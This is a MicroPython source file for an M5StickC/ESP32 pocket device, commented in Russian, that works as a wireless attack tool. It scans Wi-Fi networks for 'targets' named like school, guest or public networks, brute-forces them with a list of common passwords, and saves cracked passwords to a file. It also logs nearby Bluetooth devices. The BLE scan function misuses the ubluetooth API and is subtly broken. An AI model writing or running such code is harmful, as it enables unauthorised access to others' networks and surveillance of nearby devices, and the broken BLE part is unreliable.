# =========================================================
#                   ZetaCore.py
#           (ЯДРО УПРАВЛЕНИЯ M5StickC / ESP32)
# =========================================================

# --- 1. КРИТИЧЕСКИЕ ИМПОРТЫ ДЛЯ MICROPYTHON ---
import machine # Для управления железом (пины, SPI, I2C)
import network # Для Wi-Fi и Bluetooth (BLE)
import time    # Для задержек и таймеров
import uos     # Для работы с файловой системой (чтение/запись логов)


# --- 2. ГЛАВНЫЕ КОНСТАНТЫ ---
LOG_FILE = "log.txt"
PASSWORD_LOG = "passwords.txt"
# Ключевые слова для немедленной атаки (например, вывески)
TARGET_KEYWORDS = ["LED", "Cisco", "TF-", "School", "WiFi", "Guest", "Public", "Free", "Open", "Kab", "Internet", "Admin", "Router"] 


# --- 3. КЛАСС CORE (Для будущей инициализации всех модулей) ---
class Core:
    """
    Класс для хранения и управления основными модулями
    (WLAN, SPI для CC1101, IR)
    """
    def __init__(self):
        self.wlan = None
        self.spi = None
        self.cc1101_cs = None
        print("ZetaCore: Yadro inicializirovano.")

# ---------------------------------------------------------
#                  УТИЛИТЫ И СОХРАНЕНИЕ
# ---------------------------------------------------------

def save_log(entry: str, filename: str = LOG_FILE):
    """
    Сохраняет запись лога в указанный файл на M5StickC.
    Использует режим 'a' (append) для добавления в конец файла.
    """
    timestamp = time.ticks_ms() # Получаем метку времени в миллисекундах (для скорости)
    log_entry = f"[{timestamp}] {entry}\n"
    
    try:
        with open(filename, 'a') as f:
            f.write(log_entry)
        print(f"LOG: Zapisano v {filename}: {entry}")
        
    except Exception as e:
        print(f"ERROR: Pizdec pri zapisi loga: {e}")
        
def format_mac(mac_bytes):
    """
    Преобразует байты MAC-адреса в читаемый формат (XX:XX:XX:XX:XX:XX).
    """
    return ':'.join('{:02x}'.format(b) for b in mac_bytes)

# ---------------------------------------------------------
#                 WI-FI ИНИЦИАЛИЗАЦИЯ
# ---------------------------------------------------------

def wifi_init():
    """
    Инициализирует Wi-Fi в режиме Станции (STA) для сканирования и подключения.
    Возвращает объект WLAN или None в случае ошибки.
    """
    try:
        wlan = network.WLAN(network.STA_IF)
        wlan.active(True)
        
        # Если Wi-Fi уже включен, выключаем и включаем снова для чистоты
        if wlan.isconnected():
            wlan.disconnect()
            time.sleep(0.5)
            
        print("ZetaCore: WLAN uspeshno inicializirovan v rezhime STA.")
        save_log("WLAN|INIT|SUCCESS")
        return wlan
        
    except Exception as e:
        print(f"ERROR: Pizdec pri Wi-Fi init: {e}")
        save_log(f"WLAN|INIT|ERROR|{e}")
        return None
    
# ---------------------------------------------------------
#                WI-FI ПАССИВНОЕ СКАНИРОВАНИЕ
# ---------------------------------------------------------

def wifi_scan_passive(wlan_obj):
    """
    Пассивно сканирует Wi-Fi сети. Ищет цели по ключевым словам.
    Возвращает список критических целей (SSID, MAC, RSSI).
    """
    if not wlan_obj or not wlan_obj.active():
        print("ERROR: WLAN ne aktiven.")
        return []
        
    print("ZetaCore: Nachalo passivnogo skanirovania...")
    
    # scan() возвращает: (ssid, bssid, channel, rssi, authmode, hidden)
    networks = wlan_obj.scan()
    
    critical_targets = []
    
    for ssid_bytes, bssid, channel, rssi, authmode, hidden in networks:
        try:
            ssid = ssid_bytes.decode('utf8')
            mac = format_mac(bssid)
            
            log_entry = f"WIFI_SCAN|SSID:{ssid}|MAC:{mac}|RSSI:{rssi}"
            save_log(log_entry) # Сохраняем все найденные сети
            
            # Проверка на критические цели
            for keyword in TARGET_KEYWORDS:
                if keyword in ssid:
                    critical_targets.append((ssid, mac, rssi, channel))
                    print(f"TARGET FOUND: {ssid} (RSSI: {rssi})")
                    break
        except UnicodeError:
            # Игнорируем сети с некорректными символами
            pass
            
    print(f"ZetaCore: Skanirovanie zaversheno. Naydeno tselej: {len(critical_targets)}")
    return critical_targets

# ---------------------------------------------------------
#                 WI-FI ИМИТАЦИЯ БРУТФОРСА
# ---------------------------------------------------------

# САМЫЕ РАСПРОСТРАНЕННЫЕ ПАРОЛИ (Твои боеприпасы)
COMMON_PASSWORDS = [
    "12345678", "password", "qwerty", "admin", "11111111", 
    "00000000", "gost", "1qazxsw2", "1234567890"
]

def wifi_bruteforce_lite(wlan_obj, target_ssid: str):
    """
    Пытается подключиться к целевой сети, используя небольшой список
    самых распространенных паролей.
    """
    if not wlan_obj or not wlan_obj.active():
        print("ERROR: WLAN ne aktiven dlya ataki.")
        return False
        
    print(f"ZetaCore: Nachalo bruteforsa na tsel' '{target_ssid}'...")
    
    for password in COMMON_PASSWORDS:
        try:
            wlan_obj.connect(target_ssid, password)
            
            # Ждем 5 секунд, чтобы понять, получилось ли подключиться
            timeout_ms = time.ticks_add(time.ticks_ms(), 5000)
            while not wlan_obj.isconnected() and time.ticks_diff(timeout_ms, time.ticks_ms()) > 0:
                time.sleep(0.5)
            
            if wlan_obj.isconnected():
                log_entry = f"WIFI_CRACKED|SSID:{target_ssid}|PASS:{password}"
                save_log(log_entry, PASSWORD_LOG)
                print(f"SUCCESS: Set' {target_ssid} VZOMANA! Parol': {password}")
                wlan_obj.disconnect() # Отключаемся сразу!
                return True
            
        except Exception as e:
            # Ошибка при попытке подключения (например, неверный SSID)
            print(f"Bruteforce: Oshibka pri popytke s parol'yu '{password}': {e}")
            
    print(f"ZetaCore: Bruteforce ne udalsya na '{target_ssid}'.")
    return False

# ---------------------------------------------------------
#                  BLE-СКАНИРОВАНИЕ
# ---------------------------------------------------------

import ubluetooth # Специальный модуль MicroPython для Bluetooth

def ble_scan_passive(duration_s: int = 5):
    """
    Пассивно сканирует BLE-устройства в течение заданной длительности.
    Сохраняет MAC-адреса и имена устройств.
    """
    try:
        ble = ubluetooth.BLE()
        ble.active(True) # Активируем Bluetooth
        
        print(f"ZetaCore: Nachalo BLE-skanirovania na {duration_s} sekund.")
        
        # Начинаем сканирование (30ms окно)
        # 0 - пассивное сканирование, 1 - активное
        scanned_devices = ble.gap_scan(duration_s * 1000, 30) 
        
        if not scanned_devices:
            print("BLE: Tselej ne naydeno.")
            ble.active(False) 
            return []

        found_targets = []
        
        # gap_scan возвращает (addr_type, addr, adv_type, rssi, name)
        for addr_type, addr, adv_type, rssi, name in scanned_devices:
            mac_addr = format_mac(addr)
            device_name = name.decode('utf8') if name else "NoName"
            
            log_entry = f"BLE|MAC:{mac_addr}|NAME:{device_name}|RSSI:{rssi}"
            save_log(log_entry)
            
            found_targets.append((device_name, mac_addr, rssi))
            
        ble.active(False) # Выключаем для экономии энергии
        print(f"BLE: Naydeno ustroystv: {len(found_targets)}")
        return found_targets
        
    except Exception as e:
        print(f"ERROR: Pizdec pri BLE-skanirovanii: {e}")
        return []
